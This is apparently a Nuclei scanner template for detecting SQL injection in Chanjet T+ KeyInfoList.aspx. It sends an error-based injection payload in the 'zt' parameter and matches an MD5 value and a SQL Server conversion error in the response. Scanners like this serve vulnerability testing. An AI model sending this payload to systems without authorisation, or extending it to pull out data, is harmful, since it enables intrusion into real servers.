id: poc-yaml-changjie-tplus-keyinfolist-aspx-sqli
info:
  name: 畅捷通T+ KeyInfoList.aspx SQL漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection,两高一弱

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=%27)AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27)))--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "在将 nvarchar 值"
        part: body
      - type: word
        words:
          - "{{t2}}"
        part: body
      - type: word
        words:
          - "转换成数据类型 int 时失败"
        part: body
